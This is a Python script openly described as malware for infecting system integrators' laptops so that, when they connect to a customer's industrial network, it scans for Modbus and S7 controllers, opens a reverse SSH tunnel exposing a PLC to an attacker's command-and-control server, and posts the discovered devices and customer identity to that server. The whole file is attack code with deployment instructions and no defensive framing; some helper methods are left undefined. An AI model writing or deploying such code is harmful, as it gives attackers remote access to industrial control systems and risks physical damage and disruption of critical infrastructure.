# vendor_laptop_bridge.py - Infect system integrator laptops
# When vendor connects to customer OT network, establish C2

class VendorLaptopBridge:
    def __init__(self):
        self.customer_networks = []

    def detect_ot_network_connection(self):
        """
        Detect when laptop is connected to customer OT network
        Look for industrial protocols on network
        """
        import socket
        import nmap

        nm = nmap.PortScanner()

        # Scan local subnet for Modbus/S7/EtherNet/IP
        local_subnet = self.get_local_subnet()
        nm.scan(hosts=local_subnet, arguments='-p 502,102,44818 -sT')

        ot_devices = []
        for host in nm.all_hosts():
            if nm[host]['tcp'].get(502, {}).get('state') == 'open':  # Modbus
                ot_devices.append({'ip': host, 'protocol': 'modbus'})
            elif nm[host]['tcp'].get(102, {}).get('state') == 'open':  # S7
                ot_devices.append({'ip': host, 'protocol': 's7'})

        if ot_devices:
            print(f"[+] Connected to OT network with {len(ot_devices)} devices")
            self.establish_c2_bridge(ot_devices)

    def establish_c2_bridge(self, ot_devices):
        """
        Establish C2 tunnel from vendor laptop to OT network
        Laptop has both OT and internet connectivity
        """
        import subprocess

        # Set up reverse SSH tunnel from laptop to C2 server
        # Allows C2 server to access OT network through laptop

        ssh_tunnel_cmd = 'ssh -f -N -R 9999:192.168.10.10:502 attacker@c2server.com'
        subprocess.call(ssh_tunnel_cmd, shell=True)

        print("[+] C2 tunnel established")
        print("[*] Attacker can now access PLC 192.168.10.10 via C2 server port 9999")

        # Notify C2 server
        self.notify_c2(ot_devices)

    def notify_c2(self, ot_devices):
        """
        Notify C2 server of new OT network access
        """
        import requests

        data = {
            'vendor_id': 'laptop_12345',
            'customer': self.identify_customer(),
            'ot_devices': ot_devices,
            'tunnel_port': 9999
        }

        requests.post("https://c2.com/new_ot_access", json=data)

# Deploy on system integrator laptops
# When they connect to customer sites, automatic C2 bridge established
